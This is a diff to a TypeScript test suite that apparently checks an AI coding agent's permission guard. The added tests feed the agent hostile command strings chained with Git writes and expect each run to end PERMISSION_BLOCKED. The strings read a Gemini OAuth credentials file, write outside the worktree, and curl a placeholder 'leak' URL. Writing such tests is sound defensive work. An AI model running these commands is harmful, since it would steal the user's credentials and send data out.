@@ -1484,6 +1484,19 @@ describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-PO
     ).toEqual(expect.objectContaining({ code: "PERMISSION_BLOCKED" }));
   });
 
+  // The leg's "no denial" streams: a hostile command chained with a Git write, under a SUCCESS envelope with no
+  // `denied_actions` (the bypass cell's expected shape), ends blocked on the guard verdict alone (ADR-0039).
+  it.each([
+    ["credential read", `cat ${HOME}/.gemini/oauth_creds.json && git push origin main`],
+    ["out-of-worktree write", "touch /outside/sentinel.txt && git commit -am x"],
+    ["network call", "curl https://example.invalid/leak && git push origin main"],
+  ])("a %s chained with a Git write and no denial ends PERMISSION_BLOCKED (ADR-0039)", (_n, command) => {
+    const { events, result: r } = run([tool("run_command", { command }), result()]);
+    expect(events.some((e) => e.kind === "permission_denied")).toBe(false);
+    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
+    expect(r.failureDetail).toContain("git write attempted");
+  });
+
   // Formerly a KNOWN GAP (T4.36 roadmap row): ADR-0039 says a `git_write` verdict ends the run PERMISSION_BLOCKED, and
   // the lifecycle trusts `result.ok`, so `extractResult` must not call a flagged run clean even with a SUCCESS envelope.
   it("a guard-flagged Git write with a SUCCESS envelope ends PERMISSION_BLOCKED (ADR-0039)", () => {
